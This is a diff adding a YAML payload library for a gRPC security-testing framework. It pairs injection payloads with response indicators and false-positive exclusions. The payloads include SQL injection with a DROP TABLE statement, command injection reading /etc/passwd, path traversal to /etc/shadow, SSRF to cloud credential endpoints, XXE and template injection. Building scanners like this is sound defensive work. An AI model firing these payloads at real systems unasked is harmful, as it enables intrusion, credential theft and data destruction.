@@ -1,0 +1,364 @@
+info:
+  name: GSTF Payload Library
+  author: MZ
+  version: "2.1"
+  description: >
+    Security test payloads for gRPC API testing (GSTF Framework).
+    Covers OWASP API Security Top 10 2023 and gRPC-relevant vulnerabilities.
+    v2.1: Tightened resp indicators and added exclude lists to reduce false positives.
+
+payload:
+
+  # ── SQL Injection ──────────────────────────────────────────────────────────
+  sqli:
+    param:
+      - "'"
+      - "''"
+      - "' OR '1'='1"
+      - "' OR 1=1 --"
+      - "' OR 'a'='a"
+      - "'=''or'"
+      - "1' AND '1'='1"
+      - "' AND SLEEP(5) --"
+      - "' AND BENCHMARK(50000000,MD5(1)) --"
+      - "'; WAITFOR DELAY '0:0:5' --"
+      - "'; DROP TABLE users; --"
+      - "' UNION SELECT NULL,NULL,NULL --"
+      - "' UNION SELECT 1,table_name,3 FROM information_schema.tables --"
+      - "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()))) --"
+      # Time-based blind SQLi
+      - "' AND SLEEP(5) -- "
+      - "'; WAITFOR DELAY '0:0:5' --"
+      - "' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --"
+    resp:
+      # DB-specific error messages
+      - "syntax error"                          # broad but filtered by reflection detection
+      - "SQL Syntax Error"                      # SQLite format
+      - "You have an error in your SQL syntax"  # MySQL format
+      - "unclosed quotation mark"               # PostgreSQL format
+      - "quoted string not properly terminated" # Oracle format
+      - "ORA-00933"
+      - "ORA-00907"
+      - "pg_query"
+      - "mysql_fetch"
+      - "SQLite3::query"
+      - "Incorrect syntax near"                 # MSSQL format
+      - "database error"
+    exclude:
+      - "Login successful"
+      - "Registration successful"
+    time: 4
+
+  # ── Cross-Site Scripting (XSS) ─────────────────────────────────────────────
+  # Relevant if gRPC responses are consumed by a web UI that renders HTML.
+  # Note: reflection in error messages may produce false positives —
+  # manual verification recommended to confirm actual execution context.
+  xss:
+    param:
+      - "<script>alert('XSS')</script>"
+      - "'><script>alert('XSS')</script>"
+      - "\"<script>alert('XSS')</script>"
+      - "<img src=x onerror=alert('XSS')>"
+      - "<svg/onload=alert('XSS')>"
+      - "javascript:alert('XSS')"
+      - "<iframe src=javascript:alert('XSS')>"
+    resp:
+      - "<script>alert"
+      - "onerror=alert"
+      - "onload=alert"
+      - "<img src=x"
+      - "javascript:alert"
+    exclude:
+      # Server echoing payload back in a plain error message is not true XSS
+      - "already exists"
+      - "Invalid input"
+      - "not allowed"
+    time: 0
+
+  # ── Local File Inclusion (LFI) ─────────────────────────────────────────────
+  lfi:
+    param:
+      - "../../etc/passwd"
+      - "../../../etc/passwd"
+      - "../../../../etc/passwd"
+      - "/etc/passwd"
+      - "../../etc/shadow"
+      - "../../proc/self/environ"
+      - "../../proc/self/cmdline"
+      - "../../var/log/auth.log"
+      - "..\\..\\windows\\win.ini"
+      - "../../../../windows/system32/config/system"
+      - "../../../../boot.ini"
+      - "C:\\Windows\\win.ini"
+      - "../../etc/passwd%00"
+    resp:
+      # Highly specific — only appear in actual file contents
+      - "root:x:0:0"
+      - "nobody:x:"
+      - "/bin/bash"
+      - "/bin/sh"
+      - "[boot loader]"
+      - "[fonts]"
+      - "for 16-bit app support"
+      - "ntuser"
+    exclude:
+      - "File not found"
+      - "Permission denied"
+      - "No such file"
+    time: 0
+
+  # ── Server-Side Request Forgery (SSRF) ─────────────────────────────────────
+  ssrf:
+    param:
+      - "http://localhost:8080/admin"
+      - "http://127.0.0.1:8080"
+      - "http://0.0.0.0:8080"
+      - "http://169.254.169.254/latest/meta-data/"
+      - "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+      - "http://metadata.google.internal/computeMetadata/v1/"
+      - "http://169.254.169.254/metadata/v1/"
+      - "http://internal-service"
+      - "http://internal-service.local"
+      - "file:///etc/passwd"
+      - "file:///C:/Windows/win.ini"
+    resp:
+      # Cloud metadata — very specific, won't appear in normal responses
+      - "ami-id"
+      - "instance-id"
+      - "security-credentials"
+      - "computeMetadata"
+      - "iam/security-credentials"
+      # File access via SSRF
+      - "root:x:0:0"
+    time: 0
+
+  # ── Remote Code Execution (RCE) ────────────────────────────────────────────
+  rce:
+    param:
+      - "`whoami`"
+      - "|| whoami"
+      - "$(whoami)"
+      - "|| id"
+      - "&& uname -a"
+      - "; whoami"
+      - "| whoami"
+      - "`id`"
+      - "$(id)"
+    resp:
+      # "uid=0" and "uid=0(root)" are specific output of id/whoami commands
+      - "uid=0(root)"
+      - "uid=0"
+      - "www-data"
+      # "administrator" specific to Windows whoami output
+      - "SYSTEM"
+      - "NT AUTHORITY"
+    exclude:
+      # Normal auth error responses
+      - "Invalid credentials"
+      - "Unauthorized"
+      - "Authentication failed"
+    time: 0
+
+  # ── XPath Injection ────────────────────────────────────────────────────────
+  xpath_injection:
+    param:
+      - "' or '1'='1' or ''='"
+      - "' or 1=1 or ''='"
+      - "') or ('1'='1"
+      - "' or username() = 'admin"
+      - "' and count(//user) > 1"
+      - "' or name(/*)= 'admin"
+      - "x' or name()='username' or 'x'='y"
+    resp:
+      # Specific XPath error messages only — removed generic "Success"
+      - "XPath error"
+      - "Invalid XPath"
+      - "Incorrect use of query"
+      - "XPathException"
+      - "javax.xml.xpath"
+      - "XPathExpressionException"
+    time: 0
+
+  # ── Command Injection ──────────────────────────────────────────────────────
+  command_injection:
+    param:
+      - "127.0.0.1; ls"
+      - "127.0.0.1 && ls"
+      - "`ls /`"
+      - "1; cat /etc/passwd"
+      - "| cat /etc/passwd"
+      - "| whoami"
+      - "; cat /etc/passwd"
+      - "& dir"
+      - "| dir"
+      # Time-based command injection
+      - "; sleep 5"
+      - "&& sleep 5"
+      - "| sleep 5"
+    resp:
+      - "uid=0"
+      - "root:x:0:0"
+      - "drwxr-xr-x"
+      - "Volume in drive"
+      - "Directory of C:\\"
+    exclude:
+      - "Invalid"
+      - "not allowed"
+      - "blocked"
+    time: 4
+
+  # ── LDAP Injection ─────────────────────────────────────────────────────────
+  ldap_injection:
+    param:
+      - "(|(uid=*))"
+      - "(|(uid=admin)(uid=*))"
+      - "admin*)(userPassword=*)"
+      - "admin)(&)"
+      - ")(cn=*))"
+      - "*)(uid=*))(|(uid=*"
+      - "*()|%26'"
+    resp:
+      # LDAP-specific error classes — specific enough
+      - "LDAPException"
+      - "javax.naming.NamingException"
+      - "LDAP Result Code"
+      - "Invalid DN syntax"
+      - "com.sun.jndi.ldap"
+      - "org.springframework.ldap"
+    time: 0
+
+  # ── NoSQL Injection ────────────────────────────────────────────────────────
+  nosql_injection:
+    param:
+      - "{'$gt': ''}"
+      - "{'$ne': null}"
+      - "{'$where': '1==1'}"
+      - "{'$regex': '.*'}"
+      - "{\"$gt\": \"\"}"
+      - "{\"$ne\": null}"
+      - "{\"$where\": \"function() { return true; }\"}"
+      - "1; return true"
+    resp:
+      # MongoDB-specific error classes only — removed generic "invalid query" and "$where"
+      - "MongoError"
+      - "MongoServerError"
+      - "MongoParseError"
+      - "Cast to ObjectId failed"
+      - "BSONTypeError"
+      - "E11000 duplicate key"
+    time: 0
+
+  # ── Server-Side Template Injection (SSTI) ──────────────────────────────────
+  ssti:
+    param:
+      - "{{7*7}}"
+      - "${7*7}"
+      - "<%= 7*7 %>"
+      - "#{7*7}"
+      - "${7*'7'}"
+      - "@(7+7)"
+      - "{{config}}"
+      - "{{request}}"
+      - "%{7*7}"
+    resp:
+      # Math results — specific because they're computed values not literal strings
+      # "49" = 7*7 (Jinja2, Twig, Pebble)
+      # "7777777" = 7*'7' (Python Jinja2)
+      - "49"
+      - "7777777"
+      # Template engine identifiers
+      - "jinja2.exceptions"
+      - "TemplateNotFound"
+      - "FreeMarkerException"
+      - "ThymeleafException"
+    exclude:
+      # If 49 appears in a normal context (ID, port, etc.) combined with non-template content
+      - "port 49"
+      - "id: 49"
+    time: 0
+
+  # ── XML External Entity (XXE) ──────────────────────────────────────────────
+  xxe:
+    param:
+      - "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>"
+      - "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">]><root>&xxe;</root>"
+      - "<!DOCTYPE test [<!ENTITY xxe SYSTEM \"file:///etc/shadow\">]><data>&xxe;</data>"
+      - "<?xml version=\"1.0\" encoding=\"utf-8\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>"
+    resp:
+      # Specific to file inclusion or cloud metadata via XXE
+      - "root:x:0:0"
+      - "ami-id"
+      - "instance-id"
+      # XML parser errors revealing the DOCTYPE was processed
+      - "SAXParseException"
+      - "ExternalEntityException"
+      - "XMLParseError"
+    time: 0
+
+  # ── Format String Injection ────────────────────────────────────────────────
+  # For gRPC services backed by C/C++ or native libraries.
+  format_string:
+    param:
+      - "%s%s%s%s%s%s%s%s"
+      - "%x%x%x%x%x%x"
+      - "%p%p%p%p%p%p"
+      - "%n%n%n%n"
+      - "%d%d%d%d%d%d"
+      - "%.1000d"
+      - "%99999999999s"
+    resp:
+      # Crash/memory corruption indicators — very specific, rarely appear in normal responses
+      - "Segmentation fault"
+      - "SIGSEGV"
+      - "signal 11"
+      - "core dumped"
+      - "Aborted (core dumped)"
+      - "stack smashing detected"
+    exclude:
+      # Normal Go/Python responses that contain generic error terms
+      - "nil pointer"
+      - "runtime goroutine"
+      - "ValueError"
+    time: 0
+
+  # ── CRLF Injection ─────────────────────────────────────────────────────────
+  # For gRPC services that generate HTTP responses or write logs from input.
+  # Note: requires manual verification to confirm actual header injection vs reflection.
+  crlf_injection:
+    param:
+      # Using unique marker "X-GSTF-Test" to reduce accidental matches
+      - "test\r\nX-GSTF-Test: injected"
+      - "test%0d%0aX-GSTF-Test: injected"
+      - "test%0aX-GSTF-Test: injected"
+      - "test\r\n\r\n<html>GSTF-injected</html>"
+      - "test\nX-GSTF-Test: injected"
+    resp:
+      # Unique marker — only appears if injection is processed
+      - "X-GSTF-Test"
+      - "GSTF-injected"
+      - "response splitting"
+      - "CRLF injection"
+    exclude:
+      # If the server just echoes back the raw input in an error message, not truly vulnerable
+      - "Invalid input"
+      - "test\r\n"
+      - "test%0d%0a"
+    time: 0
+
+  # ── Business Logic ─────────────────────────────────────────────────────────
+  business_logic:
+    param:
+      - -1
+      - -1000
+      - -2147483648
+      - 0
+      - 2147483647
+      - 9999999999
+    resp:
+      # Specific to boundary/overflow errors — removed generic "invalid", "negative", "-1"
+      - "-1000"
+      - "overflow"
+      - "out of range"
+      - "exceeds maximum"
+      - "below minimum"
+    time: 0
